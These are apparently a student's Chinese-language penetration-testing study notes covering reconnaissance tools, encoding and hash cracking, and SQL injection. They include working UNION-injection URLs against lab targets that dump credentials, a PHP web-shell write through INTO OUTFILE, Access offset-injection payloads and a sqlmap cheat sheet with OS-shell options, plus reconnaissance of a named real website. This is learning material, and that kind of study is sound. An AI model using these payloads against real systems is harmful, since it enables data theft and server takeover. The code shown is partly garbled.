628端口admin，intel远程管理技术，（如果能在管理用户上添加一个新账号，在远程访问获取服务器权限）</p>
<p><strong>3.群友web授权测试下的服务测试</strong></p>
<p>目标：凯儿得乐网站<br>
工具：shodan，fofa<br>
站长工具，端口扫描工具nmap<br>
操作时：搜索引擎看信息，<br>
nmap看端口信息，<br>
资产信息，旁注，类似域名，子域名等进行搜索和查端口</p>
<p>1.从黑暗引擎搜索开始：<br>
搜索caredaily.com这样找的多<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632614397961.png" alt="" loading="lazy"><br>
根据搜索结果的信息：子域名，ip端口（ipenssh ,odb数据库，ftp协议）</p>
<p>2.使用nmap：openssh6版本，iis-http6.0<br>
在搜索引擎上可以找到很多信息，比如后台等等<br>
更具开放的端口对应的协议版本，可能有着一些曾经未完善的漏洞如openssh6.6，7版本下就有着远程代码执行的漏洞，搜索引擎并不全面，会偶一楼，再结合端口扫描，有什么用什么</p>
<p>查找子域名<br>
1.手动百度搜索：site:caredaily.com（site：把搜索范围限定在特定站点中）<br>
2.子域名查找工具：在线自己找<br>
子域名对应着的新的ip，可以对子域名和ip在进行引擎搜索和端口扫描</p>
<p>旁注<br>
旁注查询，找在线工具，查到域名或ip还是进行以上两种操作</p>
<p>类似域名：<br>
1.子域名查询：查找后缀不一样的域名<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632614526812.png" alt="" loading="lazy"><br>
2.备案查询：找到的另外的域名（一般得花钱，还是换一个吧）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632614582686.png" alt="" loading="lazy"><br>
以上备案的其他网址找到了含有一堆网站的页面，含有丰富的信息</p>
<p>对于其他业务域名，可以在主页面上点一点找一找<br>
对于不良网站可能经常更换域名等，可以再对网站的以下标题进行搜索（百度谷歌交替用一用）蒂迪师傅演示找到了之前浏览器缓存的原始版本的网站，或者也可以搜索域名关键字caredaily等</p>
<p>信息收集是个繁琐和必要的工作，信息做好记录（他根据网站后追查到网站源码类型，去尝试登陆后台）。一步步爬吧</p>
<h1 id="2021-09-26-2">2021-09-26</h1>
<h1 id="信息收集-资产监控拓展">信息收集-资产监控拓展</h1>
<p>Github监控<br>
便于收集整理最新exp或poc<br>
便于发现相关测试目标的资产<br>
如何使用（为什么使用这个技术？意识官方的ctms是需要收费的，我们可以通过监控GitHub来找到类似的源码，二是在GitHub官网上有着最细腻的检测漏洞报告）<br>
首先将下面的内部接口放在pycharm中，安装所对应的脚本所需的库，即import后面的东西<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622937384.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622940629.png" alt="" loading="lazy"><br>
接着在GitHub注册，在https://scr.ftqq.com/威胁你登录后获取SendKey，在脚本中进行更改<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622944031.png" alt="" loading="lazy"></p>
<p>绑定微信，运行脚本，就可以获取到监控的内容，以下是监控内容的填写位置<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622947669.png" alt="" loading="lazy"></p>
<p>网站只能绑定企业微信，甭能作到手机上也收到推送，后续会处理这个问题</p>
<p>各种子域名查询<br>
DNS，备案，证书<br>
全球结点请求cdn<br>
枚举爆破或解析子域名对应<br>
便于发现管理员相关的注册信息</p>
<p>黑暗引擎相关搜索fofa，shodan，zoomeye<br>
微信公众号接口获取<br>
内部群内部应用内部接口</p>
<pre><code># Title: wechat push CVE-2020
# Date: 2020-5-9
# Exploit Author: weixiao9188
# Version: 4.0
# Tested on: Linux,windows
# cd /root/sh/git/ &amp;&amp; nohup python3 /root/sh/git/git.py &amp;
# coding:UTF-8

import requests
import json
import time
import os
import pandas as pd
time_sleep = 60 #每隔 20 秒爬取一次
while(True):
headers1 = {
	&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;}
#判断文件是否存在
datas = []
response1=None
response2=None
if os.path.exists(&quot;olddata.csv&quot;):
#如果文件存在则每次爬取 10 个
	df = pd.read_csv(&quot;olddata.csv&quot;, header=None)
	datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的 nan 转化为 None
	requests.packages.urllib3.disable_warnings()
	response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-
2020&amp;sort=updated&amp;per_page=10&quot;,headers=headers1,verify=False)
	response2 =
requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10&quot;,hea
ders=headers1,verify=False)
else:
#不存在爬取全部
	datas = []
	requests.packages.urllib3.disable_warnings()
	response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers1,verify=False)
	response2 =
requests.get(url=&quot;https://api.github.com/search/repositories?q=ctcms&amp;ssort=updated&amp;order=desc&quot;,headers=headers1,verify=False)
                    
data1 = json.loads(response1.text)
data2 = json.loads(response2.text)
for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:
	for i in j:
	s = {&quot;name&quot;:i['name'],&quot;html&quot;:i['html_url'],&quot;description&quot;:i['description']}
	s1 =[i['name'],i['html_url'],i['description']]
if s1 not in datas:
#print(s1)
#print(datas)
params={
&quot;text&quot;:s[&quot;name&quot;],
&quot;desp&quot;:&quot;链接:&quot;+str(s[&quot;html&quot;])+&quot;\n简介&quot;+str(s[&quot;description&quot;])
}
print(&quot;当前推送为&quot;+str(s)+&quot;\n&quot;)
#print(params)
request.packages.urllib3.disable_warnings()
request.get(&quot;https://sct.ftqq.com/SendKey填写处.send&quot;, params=params,headers=headers1,timeout=10,verify=False)
time.sleep(1)#以防推送太快
print(&quot;推送成功！\n&quot;)
datas.append(s1)
else:
pass
print(&quot;数据已经存在！&quot;)
pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=Nonne,Index=None)   
time.sleep(time_sleep)
</code></pre>
<p>黑暗引擎实现域名端口等收集<br>
https://fofa.so/</p>
<figure data-type="image" tabindex="4"><img src="https://jinqipiaopiao.github.io//post-images/1632622960599.png" alt="" loading="lazy"></figure>
<p>全自动域名手机美剧优秀脚本使用（teemo）<br>
以xxxx为例，从标题，域名等收集</p>
<p>以xxxx为例，全自动脚本使用收集<br>
配置过程<br>
首先，我们需要在github下载后，解压文件后将文件放进python里面，然后在teemo这个文件下新建cmd.bat(里面的内容是cmd.exe)<br>
接着我们找到python2（过期了？导致后续配置还未完成，以下截图来源小迪视频）中的script文件夹，将其中的pip.exe拉入命令行中，输入以下命令<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622964707.png" alt="" loading="lazy"></p>
<p>接着将python拖入命令行界面，输入以下命令，开启teemo<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622974248.png" alt="" loading="lazy"></p>
<p>输入以下命令（-d ＋ 域名），进行子域名查询<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622977868.png" alt="" loading="lazy"></p>
<p>查询的结果放在以下文件夹中，以其名称命名<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632622981754.png" alt="" loading="lazy"></p>
<p>或者似乎用layer子域名挖掘机直接进行扫描</p>
<p>SRC目标中的信息收集全覆盖<br>
补天上专属src建议测试<br>
利用其他第三方接口获取更多信息</p>
<p>涉及资源<br>
https://crt.sh/ （查网站证书的）<br>
https://sct.ftqq.com/</p>
<p>https://dnsdb.io/zh-cn/ （详细的DNS解析记录）</p>
<p>https://sct.ftqq.com/3.version</p>
<p>https://tools.ipip.net/cdn.php （国外访问国内地址获取网站真实IP地址，之前cdn的知识）</p>
<p>https://github.com/bit4woo/teemo</p>
<p>https://securitytrails.com/domain/www.baidu.com/history/a （详细的DNS解析记录）</p>
<p>https://www.opengps.cn/Data/IP/LocHighAcc.aspx （IP地址定位）</p>
<p>前cdn的知识）</p>
<p>https://github.com/bit4woo/teemo</p>
<p>https://securitytrails.com/domain/www.baidu.com/history/a （详细的DNS解析记录）</p>
<p>https://www.opengps.cn/Data/IP/LocHighAcc.aspx （IP地址定位）<br>
————————————————<br>
版权声明：本文为CSDN博主「是阿明呐」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45889197/article/details/119299883</p>
<h1 id="2021-9-28">2021-9-28</h1>
<h1 id="基础入门-加密编码算法">基础入门-加密编码算法</h1>
<p>常见加密编码等算法解析：<br>
MD5，SHA，ASC，进制时间戳，URL，BASE64，Unescape，AES，DES等</p>
<p>MD5：十六位和三十二位，加密密文字符串都是由A-Z，0-9随机分配，百分之八十的网站管理员或用户密码采取MD5加密。（不可逆）<br>
SHA：由A-Z，0-9随机组合，SHA1,SHA256,SHA384,SHA512,长度固定（不可逆）<br>
进制：碰上的机会不是很大<br>
时间戳：网站或者服务器脚本语言里经常会使用，会在数据库用户登录和注销，注册里会使用<br>
URL：浏览器只做一次加密，在渗透绕过的时候可能会使用二次，或者三次加密方式<br>
BASE64：由A-Z,0-9，A-Z区分大小写，长度固定，长度随密文长度一次增加，经常在字符串后按出现一个&quot;=&quot;或者&quot;==&quot;.常见的代码里，密码，参数值，在WEB应用中<br>
Unescape：%u+4位数字，对应两位字符，主要应用web应用中<br>
AES：是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性，解密的难度打。用base64揭秘出来的是乱码，有很大可能是aes加密，有时候出现在字符串里面，比较著汇总安全和大型网站，安全比赛<br>
DES：类似于base64，有时候+会出现字符串里</p>
<p>常见加密形式算法解析<br>
直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p>
<p>常见加密方式（针对）<br>
枚举，自定义你想算法，可逆向</p>
<p>了解常规加密算法的特性<br>
长度位数，字符规律，代码分析，搜索获取</p>
<p>演示：<br>
某CTF比赛题目解析<br>
脚本自定义算法组合逆向<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822312092.png" alt="" loading="lazy"></p>
<p>某CMS密码加密解密<br>
MD5+salt<br>
部分CMS密码加密形式-wp,dz等<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822359090.png" alt="" loading="lazy"></p>
<p>单纯用MD5节目是无法解密成功<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822612569.png" alt="" loading="lazy"></p>
<p>用MD5+salt<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822616362.png" alt="" loading="lazy"></p>
<p>解密成功。<code>md5(md5($pass)$salt)</code><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822620419.png" alt="" loading="lazy"><br>
某URL加密地址的漏洞测试<br>
AES+Base64+自定义<br>
观察参数值加密字符串，下载源代码分析，函数定义AES加密，设计模式CBC，128位，加密密码，偏移量，两次base64减去常规一次，填充模式。(因为在网站的AES解码中，有输出为base64，故只需解码base64一次)<br>
mozhe</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1632822625073.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822628185.png" alt="" loading="lazy"></p>
<p>下载list.zip<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822631723.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822634937.png" alt="" loading="lazy"></p>
<p>先进行base64解密<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822643659.png" alt="" loading="lazy"></p>
<p>再进行AES解密<br>
<img src="https://jinqipiaopiao.github.io//post-images/1632822647361.png" alt="" loading="lazy"></p>
<h1 id="2021-09-29">2021-09-29</h1>
<h1 id="web漏洞-sql注入之简要sql注入">WEB漏洞-sql注入之简要sql注入</h1>
<figure data-type="image" tabindex="5"><img src="https://jinqipiaopiao.github.io//post-images/1632874825579.png" alt="" loading="lazy"></figure>
<p><strong>SQL注入安全测试中危害</strong><br>
分为两类：危害数据库里的数据，直接危害到网站的权限（需满足条件）</p>
<p><strong>SQL注入产生原理详细分析</strong><br>
1.SQL语句在定义的时候没有变量，就不能进行SQL注入<br>
2.可控变量，可以通过其前端（例如post，get，request）进行更改变量，带入数据库查询<br>
3.变量不存在过滤或过滤不严谨</p>
<p><strong>可能存在注入的编号选项有哪几个？</strong><br>
www.xiaodi8.com/index.php?id=8<br>
www.xiaodi8.com/?id=10<br>
www.xiaodi8.com/?id=10&amp;x=1<br>
www.xiaodi8.com/index.php(post注入，看不见变量)</p>
<p><strong>参数有x注入，哪一个注入测试正确？bc</strong><br>
a.www.xiaodi8.com/new/php?y=1 and 1=1 &amp;x=2<br>
b.www.xiaodi8.com/new/php?y=1&amp;x=2 and 1=1<br>
c.www.xiaodi8.com/new/php?y=1 and 1=1&amp;x=2 and 1=1<br>
d.www.xiaodi8.com/new/php?xx=1 and 1=1&amp;xxx=2 and 1=1</p>
<p><strong>and 和or为逻辑判断</strong><br>
如果参数id存在注入点<br>
http://www/cnhgs.net/main.php?id53(注入点)&amp;page=1<br>
-&gt; http://www/cnhgs.net/main.php?page=1&amp;id53(注入点)</p>
<p>搭建第一个SQL诸如学习靶场环境<br>
Sqlilabs注入靶场</p>
<p>学习第一个数据库MYSQL简单注入<br>
MYSQL数据库<br>
数据库A=网站A=数据库用户A<br>
表名<br>
列名<br>
数据<br>
数据库B=网站B=数据库用户B<br>
。。。。。。<br>
数据库C=网站C=数据库用户C<br>
。。。。。。</p>
<p><strong>必要知识点</strong></p>
<p>1.在mysql5.0以上版本中，mysql存在一个自带数据库名为information_schema,他是一个存储记录所有数据库名，表名，列名，的数据库，也相当于可以通过查询它指定数据库下面的表名或者列名信息<br>
2.在数据库中符号&quot;&quot;代表下一级，如xiaodi.user表示xiaodi数据库下的user表名</p>
<p>information_schema.tables 记录所有表名信息的表<br>
information_schema.columns 记录所有列名信息的表<br>
table_name 表名<br>
column_name 列名<br>
table_schema 数据库名</p>
<p>如何判断注入点？<br>
老办法：<br>
and 1=1 页面正常<br>
and 1=2 页面错误<br>
可能存在注入点</p>
<p>好办法：<br>
SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1 正常<br>
SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1 错误</p>
<p>逻辑运算符<br>
或 且 非<br>
or and xor<br>
真 且 真 = 真<br>
真 且 假 = 假<br>
真 或 假 = 真</p>
<p>SELECT * FROM users WHERE id=1 真<br>
1=1 真<br>
1=2 假</p>
<p>真且真=真<br>
真且假=假</p>
<p>SELECT * FROM users WHERE id=1 or 1=1 LIMIT 0,1 正常<br>
SELECT * FROM users WHERE id=1 or 1=2 LIMIT 0,1 正常<br>
不能用or判断<br>
为什么不能？<br>
是因为id=1为真的话，那么两个语句都为真是无法判断的，那如果id=1为假的话，可以用or进行判断</p>
<figure data-type="image" tabindex="6"><img src="https://jinqipiaopiao.github.io//post-images/1632876691869.png" alt="" loading="lazy"></figure>
<p><strong>要选用最舒服的方法测试</strong><br>
select * from users where id = 1asdsadsad（随便输入）limit 0,1<br>
随便输入后对网页有影响说明带入数据库进行查询有注入点，没有影响说明没有带入数据库查询，出现404错误说明对数据检测没有漏洞</p>
<p><strong>猜解列名数量（字段数）</strong><br>
order by x（数字）正常与错误的正常值<br>
正确的话网页正常显示，错误的话网页报错</p>
<p>http://219.153.49.228:43230/new_list.php?id=1 order by 4<br>
=select * from users where id =1 order by 4</p>
<p>网页正确说明有select搜索的是属性列个数为4</p>
<p><strong>报错猜解准备</strong><br>
http://219.153.49.228:43230/new_list.php?id=1 union select 1,2,3,4<br>
http://219.153.49.228:43230/new_list.php?id=-1%20union%20%20select%201,2,3,4<br>
或<br>
http://219.153.49.228:43230/new_list.php?id=1%20and%201=22222%20union%20%20select%201,2,3,4</p>
<p><strong>信息收集</strong><br>
数据库版本：version()           5.7.22-0ubuntu0.16.04.1<br>
数据库名字：database()          mozhe_Discuz_StormGroup<br>
数据库用户：user()                  root@localhost<br>
操作系统：@@version_compile_os      Linux</p>
<p>根据猜想的列数得到4所以union右边必须有的四个属性列<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,database(),version(),4<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,user(),@@version_compile_os,4</p>
<p><strong>查询指定数据库名</strong></p>
<p>mozhe_Discuz_StormGroup下的表名信息：<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'</p>
<p><strong>查询所有表名</strong></p>
<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'</p>
<p><strong>查询指定表名的全部列名</strong></p>
<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member'</p>
<p><strong>查询指定数据</strong><br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member</p>
<p><strong>猜解多个数据</strong><br>
可以采用limit x,1 变动猜解<br>
http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 0,1<br>
mozhe<br>
356f589a7df439f6f744ff19bb8092c0 MD5解密 dsan13</p>
<p>http://219.153.49.228:43230/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 1,1<br>
mozhe<br>
a26f03bdd67bc4a815c2c30c6daf0ce3 MD5解密 959003</p>
<figure data-type="image" tabindex="7"><img src="https://jinqipiaopiao.github.io//post-images/1632876685293.png" alt="" loading="lazy"></figure>
<p>案例<br>
简易代码分析SQL注入原理<br>
接收数据 -&gt; 拼接数据 -&gt; 数据进数据库执行 -&gt; 展示结果</p>
<figure data-type="image" tabindex="8"><img src="https://jinqipiaopiao.github.io//post-images/1632876838728.png" alt="" loading="lazy"></figure>
<p>通过参数传递到拼接好的SQL语句中，由于是拼接语句就可以将一些恶意的SQL语句拼接到上面，来实现恶意的SQL语句执行的效果</p>
<figure data-type="image" tabindex="9"><img src="https://jinqipiaopiao.github.io//post-images/1632876842225.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="https://jinqipiaopiao.github.io//post-images/1632876846630.png" alt="" loading="lazy"></figure>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/119106593</p>
<h1 id="sql注入之mysql注入">SQL注入之MYSQL注入</h1>
<p>MYSQL注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的等直接进行getshell操作，其中也会遇到哼多的阻碍，相关方与手法也要明确，所谓知己知彼，百战不殆，作为俺去那开发工作者，攻防兼备。注入点权限是否为root，取决于连接数据库的文件，这也决定了高权限注入以及低权限注入</p>
<figure data-type="image" tabindex="11"><img src="https://jinqipiaopiao.github.io//post-images/1633431704175.png" alt="" loading="lazy"></figure>
<p>跨库查询及应用思路<br>
information_schema 表特性，记录库名，表名，列名对应表</p>
<p>获取所有数据库名<br>
?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
<p>查表，找与网站对应的数据库名，若没有，则挨个查。或者使用union select 1,2,database()<br>
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='qqyw'</p>
<p>跨库查列<br>
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='admin' and table_schema='qqyw'</p>
<p>查结果<br>
?id=-1 union select 1,u,p from qqyw.admin</p>
<p><strong>文件读写操作</strong><br>
load_file():读取文件函数<br>
into outfile或者into dumpfile:导出函数<br>
路径获取常见方法：<br>
报错显示：(phpinfo.php) 遗留文件，漏洞报错，平台配置文件</p>
<p>常见读取文件列表：（需得知网站绝对路劲）<br>
union select 1,load_file('D://phpmyadmin//dudu.txt'),3</p>
<p>常见写入文件问题:魔术引号开关<br>
union select 1,<code>'&lt;?php $eval($_POST['dudu']);?&gt;'</code>,3 into outfile 'D:\WWW\DUDU.php'</p>
<p>魔术引号及常见保护<br>
php.ini中存在magic_quotes_gpc选项，称为魔术引号，此选项打开，使用get，post，cookie所接受的'单引号，“双引号，\反斜线，和NULL字符全都被加上一个反斜线转义，此时，注入类型是字符型注入已经无法构成威胁</p>
<p>isset无法绕过 替换关键字</p>
<p>在数据库使用了宽字符集而web中没考虑这个问题的情况下，在web层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0X27单引号进行转义，因此0xbf5c27，而数据进入数据库中时，由于0XBF5C是另外一个字符，因此转移符号会被前面的bf&quot;吃掉&quot;，单引号由此逃逸出来可以用来闭合语句</p>
<p>自定义关键字替换</p>
<p>WAF对常见攻击语句进行爆错绕过思路</p>
<p>低版本注入配合读取或者暴力<br>
5.0版本以下，跑字典<br>
字典或读取</p>
<h1 id="十四sql注入之类型及提交注入">十四：SQL注入之类型及提交注入</h1>
<p>简要明确参数类型<br>
数字，字符，搜索，json等<br>
简要明确请求方法<br>
GET,POST,COOKIE,REQUEST,HTTP头<br>
其中SQL语句干扰符号：' &quot; % ) } 等，具体查看用法</p>
<p>非字符串需要单，双引号括起 需要闭合，才能形成and 1=1 逻辑判断</p>
<p>前提是寻求请求方法，然后来进行测试。</p>
<p>需了解json类型的注入</p>
<h1 id="2021-10-06">2021-10-06</h1>
<h1 id="sql注入之oraclemongodb等注入">SQL注入之Oracle，MongoDB等注入</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1633485604417.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1633485624129.png" alt="" loading="lazy"></p>
<p><strong>简要学习各种数据库的注入特点</strong><br>
数据库架构组成，数据库高权限操作</p>
<p>ACCESS,MYSQL,MSSQL,MONGODB,POSTGRESQL,SQLITE,ORACLE,SYBASE等<br>
除了Access其他数据库组成架构基本都是大同小异<br>
Access 表名，列名，数据</p>
<p>access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633485800302.png" alt="" loading="lazy"></p>
<p>mysql mssql等<br>
数据库名A<br>
表名<br>
列名<br>
数据<br>
数据库名B<br>
。。。。。。</p>
<p>每个数据库功能不同，我们采取注入的时候攻入方式不同</p>
<p><strong>什么决定注入点用户权限？</strong><br>
<strong>数据库配置文件</strong></p>
<p><strong>Access</strong><br>
用sqlmap判断数据库类型<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633485885586.png" alt="" loading="lazy"></p>
<p>Access只是单纯的数据库，只有数据，没有数据库名，数据库版本，操作系统等功能，没有information_shcema。可直接查询数据，获取表名，列名。<br>
用猜解方式猜解表名，列名</p>
<pre><code>219.153.49.228:43932/new_list.asp?id=-1 union select 1,2,3,4 from admin
219.153.49.228:43932/new_list.asp?id=-1 union select username,passwd,3,4 from admin
</code></pre>
<figure data-type="image" tabindex="12"><img src="https://jinqipiaopiao.github.io//post-images/1633485973780.png" alt="" loading="lazy"></figure>
<p><strong>access注入时，如果列名或者表名才接不到的情况怎么办?</strong><br>
<strong>Access偏移注入</strong></p>
<p>偏移注入主要是针对知道表，但是不知道字段的ACCESS数据库。</p>
<p>比如我们已经知道了表名是 admin</p>
<p>1.判断字段数：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 order by 22            返回正常
http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 order by 23           返回错误
</code></pre>
<p>2.字段数为 22</p>
<p>爆出显示位：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://jinqipiaopiao.github.io//post-images/1633486232145.png" alt="" loading="lazy"></figure>
<p>3.判断表内存在的字段数</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin       返回同上图一样得显示位页面
http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from admin   返回错误
</code></pre>
<p>说明了admin表下有6个字段；</p>
<p>用&quot;<em>&quot;代表 admin 表的字段数，计算</em>代替字符的位数。</p>
<p>Access偏移注入原理，基本公式为：</p>
<p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p>
<p>也就是：</p>
<pre><code>`* = 6个字符`

2 × * = 12个字符

22 - 12 = 10个字符
</code></pre>
<p>5.注入公式如下：(爆破内容是随机的)<br>
一级偏移注入公式：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id = b.id)
</code></pre>
<p>此时可以增加a.id或者b.id或者a.id和b.id一起加上去来改变随机爆破出来的内容比如：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,5,6,7,8,9,10,a.id,b.id,* from (admin as a inner join admin as b on a.id = b.id)
</code></pre>
<p>二级偏移注入公式：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)
</code></pre>
<p>此时可以增加a.id或者b.id或者a.id和b.id一起加上去来改变随机爆破出来的内容比如：</p>
<pre><code>http://192.168.74.136:8002/Production/PRODUCT_DETAIL.asp?id=1406 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id = b.id)inner join admin as c on a.id=c.id)
</code></pre>
<p>注意：这里是10个字段再减去了表里的6个字段，所以二级偏移这里是select 1,2,3,4</p>
<p>注意：查看源代码有奇效，可能会出现惊喜<br>
<img src="https://jinqipiaopiao.github.io//post-images/1633486438563.png" alt="" loading="lazy"></p>
<p>简要学习各种注入工具的使用指南<br>
熟悉工具的支持库，注入模式，优缺点等</p>
<p>Sqlmap，NoSQLAttack，Pangolin等</p>
<p>安装Sqlmap<br>
image-20210812224625210<br>
来源网站：https://www.cnblogs.com/bmjoker/p/9326258.html<br>
安装Sqlmap</p>
<p>基本操作笔记：-u  #注入点<br>
-f  #指纹判别数据库类型<br>
-b  #获取数据库版本信息<br>
-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;)<br>
-D &quot;&quot;  #指定数据库名<br>
-T &quot;&quot;  #指定表名<br>
-C &quot;&quot;  #指定字段<br>
-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume)<br>
--level=(1-5) #要执行的测试水平等级，默认为1<br>
--risk=(0-3)  #测试执行的风险等级，默认为1<br>
--time-sec=(2,5) #延迟响应，默认为5<br>
--data #通过POST发送数据<br>
--columns        #列出字段<br>
--current-user   #获取当前用户名称<br>
--current-db     #获取当前数据库名称<br>
--users          #列数据库所有用户<br>
--passwords      #数据库用户所有密码<br>
--privileges     #查看用户权限(--privileges -U root)<br>
-U               #指定数据库用户<br>
--dbs            #列出所有数据库<br>
--tables -D &quot;&quot;   #列出指定数据库中的表<br>
--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段<br>
--dump-all            #列出所有数据库所有表<br>
--exclude-sysdbs      #只列出用户自己新建的数据库和表<br>
--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname)<br>
--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据<br>
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)<br>
--os      #指定系统(Linux,Windows)<br>
-v  #详细的等级(0-6)<br>
0：只显示Python的回溯，错误和关键消息。<br>
1：显示信息和警告消息。<br>
2：显示调试消息。<br>
3：有效载荷注入。<br>
4：显示HTTP请求。<br>
5：显示HTTP响应头。<br>
6：显示HTTP响应页面的内容<br>
--privileges  #查看权限<br>
--is-dba      #是否是数据库管理员<br>
--roles       #枚举数据库用户角色<br>
--udf-inject  #导入用户自定义函数（获取系统权限）<br>
--union-check  #是否支持union 注入<br>
--union-cols #union 查询表记录<br>
--union-test #union 语句测试<br>
--union-use  #采用union 注入<br>
--union-tech orderby #union配合order by<br>
--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;)<br>
--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)<br>
--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;)<br>
--user-agent &quot;&quot;  #自定义user-agent<br>
--proxy &quot;http://127.0.0.1:8118&quot; #代理注入<br>
--string=&quot;&quot;    #指定关键词,字符串匹配.<br>
--threads 　　  #采用多线程(--threads 3)<br>
--sql-shell    #执行指定sql命令<br>
--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1&quot; )<br>
--file-read    #读取指定文件<br>
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)<br>
--file-dest    #要写入的文件绝对路径<br>
--os-cmd=id    #执行系统命令<br>
--os-shell     #系统交互shell<br>
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/)<br>
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/)<br>
--os-smbrelay  #<br>
